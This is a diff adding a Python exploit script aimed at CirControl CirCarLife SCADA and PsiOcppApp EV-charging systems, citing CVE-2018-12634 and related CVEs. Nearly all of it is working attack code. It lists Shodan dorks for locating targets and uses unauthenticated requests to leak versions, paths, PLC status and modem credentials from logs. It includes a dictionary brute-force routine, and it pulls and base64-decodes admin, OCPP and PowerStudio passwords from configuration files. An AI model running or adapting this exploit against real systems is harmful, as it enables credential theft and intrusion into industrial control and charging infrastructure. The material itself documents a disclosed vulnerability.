@@ -1,0 +1,371 @@
+# Exploit Title: CirCarLife SCADA 4.3.0 - Credential Disclosure	
+# Date: 2018-09-10
+# Exploit Author: David Castro
+# Vendor Homepage: https://circontrol.com/
+# Shodan Dork: Server: CirCarLife Server: PsiOcppApp
+# Version: CirCarLife Scada all versions under 4.3.0 OCPP implementation all versions under 1.5.0
+# CVE : CVE-2018-12634
+
+'''
+Description: Mutiple information disclosure issues, including admin credentials disclosure
+'''
+
+import requests
+from requests.auth import HTTPDigestAuth
+from termcolor import colored
+from bs4 import BeautifulSoup
+import xml.etree.ElementTree as ET
+import re
+import json
+import base64 
+
+cabecera = '''
+                              _.-="_-         _
+                         _.-="   _-          | ||"""""""---._______     __..
+             ___.===""""-.______-,,,,,,,,,,,,`-''----" """""       """""  __'
+      __.--""     __        ,'     CIR-PWN-LIFE  o \            __        [__|
+ __-""=======.--""  ""--.=================================.--""  ""--.=======:
+]       [w] : /        \ : |========================|    : /        \ :  [w] :
+V___________:| SadFud75 |: |========================|    :|          |:   _-"
+ V__________: \        / :_|=======================/_____: \        / :__-"
+ -----------'  "-____-"  `-------------------------------'  "-____-"
+
+'''
+
+print colored(cabecera, 'white')
+print colored('[*] POC for automated exploitation for CirControl SCADA systems (circarlife and OCPP (Open Charge Point Protocol))', 'blue')
+print colored('[?] Vendor site: https://circontrol.com/', 'yellow')
+print colored('[*] CVEs associated: ', 'blue') 
+print colored('CVE-2018-12634, CVE-2018-16668, CVE-2018-16669, CVE-2018-16670, CVE-2018-16671, CVE-2018-16672', 'yellow')
+print colored('[*] CirCarLife Scada versions affected: ', 'blue') 
+print colored('[+] All versions are vulnerable. No patch available, last version 4.3.0 (09/09/2018)', 'green')
+print colored('[*] PsiOcppApp (PowerStudio integration Open Charge Point Protocol Application) versions affected: ', 'blue') 
+print colored('[+] All versions are vulnerable. No patch available, last version 1.5.0 (09/09/2018)', 'green')
+print colored('[*] Shodan dorks: ', 'blue')
+print colored('[+] Server: CirCarLife', 'green')
+print colored('[+] Server: PsiOcppApp', 'green')
+print colored('[?] More vulnerability POCs at https://github.com/SadFud/Exploits', 'yellow')
+
+plcs = []
+logutil = ['GPRS modem details']
+autenticado = False
+
+arr_versionessoft = []
+arr_ldevstat = []
+str_repository = ''
+str_lversioneshard = ''
+arr_logdetails = []
+str_lsetup = ''
+str_lconfig = ''
+
+def lversionessoft(): 
+    print colored('[*] Getting software versions via CVE-2018-16671', 'blue')
+    leakv = requests.get(target1 + '/html/device-id')
+    versiones = leakv.text.encode("utf8").split('\n')
+    print colored('[+] Software versions collected succesfully', 'green')
+    return versiones
+
+def ldevstat(): 
+    print colored('[*] Getting plc status via CVE-2018-16670', 'blue')
+    leakstats = requests.get(target1 + '/services/user/values.xml?var=STATUS')
+    statsraw = leakstats.text
+    tree = ET.fromstring(statsraw)
+    for i in range(0,len(tree.findall(".//variable"))):
+        for j in range(0,2):
+            plcs.append(tree[i][j].text)
+    print colored('[+] information leaked from ' + str(len(plcs)/2) + ' plcs', 'green')
+    return plcs
+
+def plcstatus(code): 
+    code = int(code)
+    if code == 1:
+        print colored('[+] OK', 'green')
+    elif code == 2:
+        if code == 0x10:
+            if code == 0x20:
+                print colored('[-] Error: Time out.', 'red')
+            elif code == 0x40:
+                print colored('[-] Error: Bad device.', 'red')
+            elif code == 0x80:
+                print colored('[-] Error: Bad phase.', 'red')
+            elif code == 0x100:
+                print colored('[-] Error: Bad version.', 'red')
+        else:
+            print colored('[-] Error: Unknown error.', 'red')
+    elif code == 4:
+        print colored('[-] Error: not initialized.', 'red')
+    else:
+        print colored('[?] Unknown code.', 'yellow')
+
+def repository(): 
+    print colored('[*] Getting installation paths via CVE-2018-16668', 'blue')
+    path = requests.get(target1 + '/html/repository')
+    rutas = path.text.encode("utf8").split('\n')
+    platformpath = rutas[1].split(' ')
+    platformpath = platformpath[0]
+    appsrc = rutas[3]
+    appsrc = rutas[3].split(' ')
+    appsrc = appsrc[0]
+    raiz = str(appsrc).find('/circarlife/')
+    appsrc = appsrc[0:raiz+len('/circarlife/')]
+    print colored('[+] Platform installation path retrieved succesfully', 'green')  
+    return 'Platform installation path: ' + platformpath + '\n[+] Applicaction installation path: ' + appsrc
+    
+def lversioneshard(): 
+    print colored('[*] Getting powerstudio driver versions via CVE-2018-12634', 'blue')
+    basura = ['/li', '<', 'body', 'html', '>', '/ul', '/']
+    hardleak = requests.get(target1 + '/services/system/info.html')
+    hardleak = hardleak.text.encode("utf8").replace('<br />', '\n')
+    hardleak = hardleak.replace('<li>', '\n')
+    for caca in basura:
+        hardleak = hardleak.replace(caca, '')
+    print colored('[+] Powerstudio driver versions leaked succesfully', 'green')
+    return hardleak
+
+def logdetails():
+    print colored('[*] Leaking sensitive information via CVE-2018-12634', 'blue')
+    log = requests.get(target1 + '/html/log')
+    log = log.text.encode("utf8")
+    print colored('[*] Searching for modem id', 'blue')
+    posmid = log.rfind('/modem-start: modem id: ')
+    logarr = log.split('\n')    
+    if posmid != -1:
+        logutil.append('Modem model:')
+        print colored('[*] Modem id located', 'blue')
+        for linea in logarr:
+            if '/modem-start: modem id: ' in linea:
+                print colored('[+] Modem id leaked', 'green')            
+                linea = linea.split(' ')
+                logutil.append(linea[9])
+    else:
+        print colored('[-] Modem id not found', 'red')
+    print colored('[*] Searching for GPRS modem credentials', 'blue')
+    poslogin = log.rfind('Greetings!!')
+    if poslogin != -1:
+        print colored('[*] Credentials found', 'blue')
+        logutil.append('Modem credentials')
+        print colored('[+] GPRS modem credentials retrieved', 'green')
+        for linea in logarr:
+            if 'password=\"' in linea:
+                linea = linea.split(' ')
+                logutil.append(linea[11])
+                logutil.append(linea[12])
+    else:
+        print colored('[-] GPRS modem credentials not found with CVE-2018-12634', 'red')
+    return logutil
+
+def lsetup(user, pwd): 
+    print colored('[*] Exploiting CVE-2018-16672 to leak information', 'blue')
+    r1 = requests.get(target1 + '/services/system/setup.json', auth=HTTPDigestAuth(user, pwd))
+    if r1.text.encode("utf8").find('not granted') != -1:
+        print colored('[-] Error, login failed', 'red')
+    else:
+        respuesta = r1.text.encode("utf8")
+        print colored('[+] Setup information leaked')
+        return respuesta
+
+def lbrute():
+    global luser80
+    global lpasswd80
+    global luser8080
+    global lpasswd8080
+    dicc = raw_input('Enter dictionary file with extension[format[user:password]]: ')
+    listado = open(dicc, "r")
+    data = listado.readlines() 
+    print colored('[*] Starting bruteforce...', 'blue')
+    for linea in data:
+        linea = linea.split(':')
+        user = linea[0]
+        pwd = linea[1]
+        r1 = requests.get(target1 + '/services/system/setup.json', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
+        r2 = requests.get(target2 + '/services/config/config.xml', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
+        if r1.text.encode("utf8").find('not granted') != -1:
+            print colored('[-] Error, login failed on port 80 with ' + user + ':' + pwd, 'red')
+        else:
+            print colored('[+] Valid credentials found on port 80: ' + user + ':' + pwd, 'green')
+            luser80 = user
+            lpasswd80 = pwd
+        if r2.text.encode("utf8").find('Acess not granted') != -1:
+            print colored('[-] Error, login failed on port 8080 with ' + user + ':' + pwd, 'red')
+        else:
+            print colored('[+] Valid credentials found on port 8080: ' + user + ':' + pwd, 'green')
+            luser8080 = user
+            lpasswd8080 = pwd
+    listado.close()
+
+def lconfig(user, pwd):
+    print colored('[*] Leaking config file via CVE-2018-16669', 'blue')
+    r2 = requests.get(target2 + '/services/config/config.xml', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
+    if r2.text.encode("utf8").find('Acess not granted') != -1:
+        print colored('[-] Error. Login failed', 'red')
+    else:
+        config = r2.text.encode('utf8')
+        print colored('[+] Config file leaked succesfully', 'green')
+        return config
+
+def salida(versiones, plcs, ruta, hard, log, setup, config):
+    print colored('[*] Parsing information and generating output.', 'blue')
+    print colored('[*] Parsing software information', 'blue')
+    print colored('[+] Device name: ', 'green') + versiones[0]
+    print colored('[+] Software_name: ', 'green') + versiones[1]
+    print colored('[+] Software_version: ', 'green') + versiones[2] 
+    print colored('[+] System time: ', 'green') + versiones[3]
+    print colored('[+] ', 'green') + ruta
+    print colored('[*] Parsing powerstudio driver versions', 'blue')
+    hard = hard.replace('ul', '')
+    print colored(hard.strip(), 'green')
+    print colored('[*] Parsing PLCs values', 'blue')
+    for i in range(0,len(plcs)):
+        if ((i % 2) != 0):
+            codigo = plcs[i].split('.')
+            plcstatus(codigo[0])
+        else:
+            nombre = plcs[i].replace('.STATUS', '')
+            print colored('[+] PLC name: ' + nombre, 'green')
+    print colored('[*] Parsing leaked data from logs using CVE-2018-12634', 'blue')
+    if len(log) > 3:
+        print colored('[*] ' + log[0], 'blue')
+        for i in range(2,len(log)):
+            if log[i] != 'Modem credentials':
+                print colored('[+] GPRS router model found: ', 'green') + log[i]
+                break
+        for i in range(0,len(log)):
+            if log[i] == 'Modem credentials':
+                creds = i
+                break
+
+        for i in range(creds + 1, len(log)):
+            if (log[i].rfind('user=')) != -1:
+                usuario = log[i].split('=')
+                user = usuario[1]
+                user = user.replace('\"', '')
+            if (log[i].rfind('password=')) != -1:
+                cont = log[i].split('=')
+                contrase = cont[1]
+                contrase = contrase.replace('\"', '')
+                contrase = contrase.replace(']', '')
+                break
+        print colored('[+] Username and password for GPRS modem found: ', 'green') + user + ':' + contrase
+    else:
+        colored('[?] No data was extracted from logs using CVE-2018-12634', 'yellow')
+    print colored('[*] Parsing setup file', 'blue')
+    if (len(str(setup)) > 5):
+        datos = json.loads(setup)
+        print colored('[*] Processing device configuration data: ', 'blue')
+        print colored('[+] MAC Address: ', 'green') + datos["device"]["mac"]
+        print colored('[+] IMEI: ', 'green') + datos["device"]["imei"]
+        print colored('[+] ICCID: ', 'green') + datos["device"]["iccid"]
+        print colored('[+] IMSI: ', 'green') + datos["device"]["imsi"]
+        print colored('[*] Processing network configuration data: ', 'blue')
+        print colored('[+] Hostname: ', 'green') + datos["network"]["hostname"]
+        print colored('[+] ClientId: ', 'green') + datos["network"]["clientid"]
+        print colored('[+] IP address: ', 'green') + datos["network"]["ip"]
+        print colored('[+] Netmask: ', 'green') + datos["network"]["netmask"]
+        print colored('[+] Gateway: ', 'green') + datos["network"]["gateway"]
+        print colored('[+] Name server 0: ', 'green') + datos["network"]["nameserver0"]
+        print colored('[+] Name server 1: ', 'green') + datos["network"]["nameserver1"]
+        print colored('[*] Processing locale options configuration data', 'blue')
+        print colored('[+] Language: ', 'green') + datos["locale"]["language"]
+        print colored('[+] Currency: ', 'green') + datos["locale"]["currency"]
+        print colored('[*] Processing public address configuration data', 'blue')
+        print colored('[+] Host type: ', 'green') + datos["paddress"]["hosttype"]
+        print colored('[+] Host: ', 'green') + datos["paddress"]["host"]
+        print colored('[*] Processing time configuration data', 'blue')
+        print colored('[+] NTP Server 0: ', 'green') + datos["time"]["ntpserver0"]
+        print colored('[+] NTP server 1: ', 'green') + datos["time"]["ntpserver1"]
+        print colored('[+] Timezone: ', 'green') + datos["time"]["timezone"]
+        print colored('[*] Processing GPRS modem configuration data', 'blue')
+        print colored('[+] Acess point name: ', 'green') + datos["modem"]["apn"]
+        print colored('[+] Username: ', 'green') + datos["modem"]["usr"]
+        print colored('[+] Password: ', 'green') + datos["modem"]["pwd"]
+        print colored('[+] Reset: ', 'green') + str(datos["modem"]["reset"])
+        print colored('[+] Ping Ip: ', 'green') + str(datos["modem"]["pingip"])
+        print colored('[+] Ping period: ', 'green') + str(datos["modem"]["pingperiod"])
+        print colored('[+] Ping auto reset: ', 'green') + str(datos["modem"]["pingautoreset"])
+        print colored('[*] Processing DDNS configuration data', 'blue')
+        print colored('[+] DDNS server: ', 'green') + datos["ddns"]["server"]
+        print colored('[+] DDNS host: ', 'green') + datos["ddns"]["host"]
+        print colored('[+] DDNS Username: ', 'green') + datos["ddns"]["usr"]
+        print colored('[+] DDNS password: ', 'green') + datos["ddns"]["pwd"]
+        print colored('[*] Processing security configuration data', 'blue')
+        print colored('[+] Username: ', 'green') + datos["security"]["user"]
+        print colored('[+] Password: ', 'green') + str(datos["security"]["passwd"])
+        print colored('[*] Processing services configuration data', 'blue')
+        print colored('[+] iManager', 'green') + str(datos["services"]["imanager"])
+        print colored('[+] Active-Integration: ', 'green') + str(datos["services"]["activeIntegration"])
+        print colored('[+] Web Editor: ', 'green') + str(datos["services"]["webeditor"])
+        print colored('[+] SCADA Applet: ', 'green') + str(datos["services"]["appletscada"])
+        print colored('[+] Html5: ', 'green') + str(datos["services"]["html5"])
+        print colored('[*] Parsing Open Charge Point Protocol configuration file', 'blue')
+    else:
+        print colored('[-] Unable to retrieve the setup config file', 'red')
+    if (len(str(config)) > 10):
+        tree = ET.fromstring(config)
+        print colored('[*] Processing management system CS settings', 'blue')
+        print colored('[+] End point: ', 'green') + str(tree.find('.//csEndPoint').text)
+        print colored('[+] Username: ', 'green') + str(tree.find('.//csUser').text)
+        print colored('[+] Password: ', 'green') + str(tree.find('.//csPassword').text)
+        print colored('[+] Litle endian: ', 'green') + str(tree.find('.//isLitleEndian').text)
+        print colored('[*] Processing Charge Box settings file', 'blue')
+        print colored('[+] Charge box Protocol: ', 'green') + str(tree.find('.//cbProtocol').text)
+        print colored('[+] Charge box certificate: ', 'green') + str(tree.find('.//cbRequireCsClientCertificate').text)
+        print colored('[+] Charge box ID: ', 'green') + str(tree.find('.//cbId').text)
+        print colored('[+] Charge box Username: ', 'green') + str(tree.find('.//cbUser').text)
+        print colored('[+] Charge box password: ', 'green') + str(tree.find('.//cbPassword').text)
+        print colored('[+] Charge box OCPP internal port: ', 'green') + str(tree.find('.//cbOcppPortInternal').text)
+        print colored('[+] Charge box OCPP public port: ', 'green') + str(tree.find('.//cbOcppPortPublic').text)
+        print colored('[+] Charge box use whitelist: ', 'green') + str(tree.find('.//cbUseWl').text)
+        print colored('[+] Charge box whitelist first: ', 'green') + str(tree.find('.//cbWlFirst').text)
+        print colored('[+] Charge box offline authentication: ', 'green') + str(tree.find('.//cbAuthOffline').text)
+        print colored('[+] Charge box internal error retry delay: ', 'green') + str(tree.find('.//cbRetryInternalErr').text)
+        print colored('[+] Charge box use OCPP T-Sync: ', 'green') + str(tree.find('.//cbUseOcppTSync').text)
+        print colored('[+] Charge box use compression: ', 'green') + str(tree.find('.//cbUseCompression').text)
+        print colored('[+] Charge box use aprtial energy: ', 'green') + str(tree.find('.//cbUsePartialEnergy').text)
+        #print colored('[+] Charge box use partial energy meter value: ', 'green') + str(tree.find('.//cbUsePartialEnergyMeterVal').text)
+        print colored('[+] Charge box stop if unauthenticated: ', 'green') + str(tree.find('.//cbStopIfUnauth').text)
+        print colored('[+] Charge box stop if concurrent tx: ', 'green') + str(tree.find('.//cbStopIfConcurrentTx').text)
+        print colored('[+] Charge box hearth-beat interval: ', 'green') + str(tree.find('.//cbHbInterval').text)
+        print colored('[+] Charge box connection time out interval: ', 'green') + str(tree.find('.//cbConnTimeOut').text)
+        print colored('[+] Charge box meter interval: ', 'green') + str(tree.find('.//cbMeterInterval').text)
+        #print colored('[+] Charge box public Ip timeout interval: ', 'green') + str(tree.find('.//cbPublicIpTimeOut').text)
+        #print colored('[+] Charge box authentication required for remote start: ', 'green') + str(tree.find('.//cbRequireAuthRemoteStart').text)
+        #print colored('[+] Charge box meter requires power: ', 'green') + str(tree.find('.//cbMeterValRequiresPower').text)
+        print colored('[*] Processing Powerstudio engine settings file' , 'blue')
+        print colored('[+] Powerstudio engine host: ', 'green') + str(tree.find('.//pwStdHost').text)
+        print colored('[+] Powerstudio engine port: ', 'green') + str(tree.find('.//pwStdPort').text)
+        print colored('[+] Powerstudio engine username: ', 'green') + str(tree.find('.//pwStdUser').text)
+        print colored('[+] Powerstudio engine password: ', 'green') + base64.b64decode(str(tree.find('.//pwStdPassword').text))
+        print colored('[+] Powerstudio engine username (with edit permissions): ', 'green') + str(tree.find('.//pwStdUserEdit').text)
+        print colored('[+] Powerstudio engine password (with edit permissions): ', 'green') + base64.b64decode(str(tree.find('.//pwStdPasswordEdit').text))
+        print colored('[*] Processing powerstudio application parameters', 'blue')
+        print colored('[+] Powerstudio application port: ', 'green') + str(tree.find('.//pssPort').text)
+        print colored('[+] Powerstudio application admin: ', 'green') + str(tree.find('.//pssAdminUser').text)
+        print colored('[+] Powerstudio application password: ', 'green') + base64.b64decode(str(tree.find('.//pssAdminPassword').text))
+        print colored('[+] Powerstudio application debug logging level: ', 'green') + str(tree.find('.//pssLoglevel').text)
+    else:
+        print colored('[-] Unable to retrieve the OCPP config file', 'red')
+
+#entrypoint
+url = raw_input('Insert target ip: ')
+target1 = 'http://' + url 
+target2 = 'http://' + url + ':8080'
+luser80 = 'admin'
+lpasswd80 = '1234'
+luser8080 = 'admin'
+lpasswd8080 = '1234'
+luser80 = raw_input('Insert username for login at circarlife server: (b to bruteforce)')
+if (luser80 == 'b'):
+    lbrute()
+else:    
+    lpasswd80 = raw_input('Insert password for login at circarlife server: ')
+    luser8080 = raw_input('Insert username for login at OCPP server: ')
+    lpasswd8080 = raw_input('Insert password for login at OCPP server: ')
+
+versiones = lversionessoft()   
+plcs = ldevstat()
+ruta = repository()
+hard = lversioneshard()
+log = logdetails()
+setup = lsetup(luser80.strip(), lpasswd80.strip())
+config = lconfig(luser8080.strip(), lpasswd8080.strip())
+salida(versiones, plcs, ruta, hard, log, setup, config)
